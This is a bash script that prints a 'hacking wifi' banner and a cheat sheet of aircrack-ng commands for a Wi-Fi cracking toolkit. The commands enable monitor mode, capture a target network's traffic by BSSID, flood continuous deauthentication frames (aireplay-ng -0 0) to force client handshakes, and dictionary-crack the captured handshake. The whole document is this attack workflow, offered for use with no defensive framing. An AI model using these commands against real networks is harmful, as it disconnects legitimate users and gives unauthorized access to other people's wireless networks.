 #!/bin/bash
#figlet "hacking wifi"                
toilet -f big --filter metal "hacking wifi"
#+-+-+-+-+ +-+-+-+-+-+-+-+   .               .    +-+-+-+-+ +-+-+-+"
#|w|i|f|i| |m|o|n|i|t|o|r| .´  ·  .  ?  .  ·  `.  |w|i|f|i| |c|a|p|
#+-+-+-+-+ +-+-+-+-+-+-+-+ :  :  :  (¯)  :  :  :  +-+-+-+-+ +-+-+-+
#+-+-+-+-+ +-+-+-+-+-++-   `.  ·  ` /¯\ ´  ·  .´ +-+ +-+-+-+-+-+-+-+-+
#|w|i|f|i| |h|s|h|a|k|e|     `     /¯¯¯\     ´   |w|i|f|i| |c|r|a|c|k|
#+-+-+-+-+ +-+-+-+-+-+-+          /-----\        +-+-+-+-+ +-+-+-+-+-+
#                        by Sanjeev Stephan Murmu
                        
cat /home/script/wificrack/hwifi

echo "    script                 Command Syntax"
echo " --------------        -----------------------"
echo "                       airmon-ng $(tput setaf 4)start wlan0 $(tput setaf 7) "
echo " wifimonitor.sh        airodump-ng $(tput setaf 2) wlan0mon $(tput setaf 7)"
echo " wificapture.sh        airodump-ng --bssid $(tput setaf 1) (bssid) $(tput setaf 7) -c $(tput setaf 1) (channel) $(tput setaf 7) --write $(tput setaf 1) (cap-dir) $(tput setaf 2) wlan0mon $(tput setaf 7)"
echo " wifihandshake.sh      aireplay-ng -0 0 $(tput setaf 2)-a $(tput setaf 1)(bssid) $(tput setaf 2)wlan0mon $(tput setaf 7)"
echo " wificrack.sh          aircrack-ng -w $(tput setaf 4)/path/to/dictionary-file.txt $(tput setaf 7)-b $(tput setaf 1)(bssid) $(tput setaf 4)/path/to/cap/file.cap"





